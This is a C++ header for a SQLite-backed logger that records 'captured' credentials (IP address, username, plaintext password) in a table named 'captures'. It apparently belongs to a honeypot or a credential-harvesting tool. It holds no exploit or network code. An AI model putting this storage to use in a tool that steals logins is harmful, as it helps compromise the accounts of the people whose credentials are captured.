#pragma once

#include <sqlite3.h>
#include <string>
#include <iostream>

class DatabaseLogger {
private:
    sqlite3* db;

public:
    DatabaseLogger() : db(nullptr) {}
    ~DatabaseLogger() { if (db) sqlite3_close(db); }

    bool init(const std::string& db_file) {
        if (sqlite3_open(db_file.c_str(), &db) != SQLITE_OK) {
            std::cerr << "[-] Failed to open database: " << sqlite3_errmsg(db) << std::endl;
            return false;
        }

        const char* create_table_sql = 
            "CREATE TABLE IF NOT EXISTS captures ("
            "id INTEGER PRIMARY KEY AUTOINCREMENT, "
            "ip_address TEXT, "
            "username TEXT, "
            "password TEXT, "
            "timestamp DATETIME DEFAULT CURRENT_TIMESTAMP);";

        char* err_msg = nullptr;
        if (sqlite3_exec(db, create_table_sql, nullptr, nullptr, &err_msg) != SQLITE_OK) {
            std::cerr << "[-] Failed to create table: " << err_msg << std::endl;
            sqlite3_free(err_msg);
            return false;
        }
        return true;
    }

    void log_credential(const std::string& ip, const std::string& username, const std::string& password) {
        if (!db) return;

        const char* insert_sql = "INSERT INTO captures (ip_address, username, password) VALUES (?, ?, ?);";
        sqlite3_stmt* stmt;

        if (sqlite3_prepare_v2(db, insert_sql, -1, &stmt, nullptr) == SQLITE_OK) {
            sqlite3_bind_text(stmt, 1, ip.c_str(), -1, SQLITE_TRANSIENT);
            sqlite3_bind_text(stmt, 2, username.c_str(), -1, SQLITE_TRANSIENT);
            sqlite3_bind_text(stmt, 3, password.c_str(), -1, SQLITE_TRANSIENT);

            if (sqlite3_step(stmt) != SQLITE_DONE) {
                std::cerr << "[-] Failed to insert record: " << sqlite3_errmsg(db) << std::endl;
            }
            sqlite3_finalize(stmt);
        }
    }
};
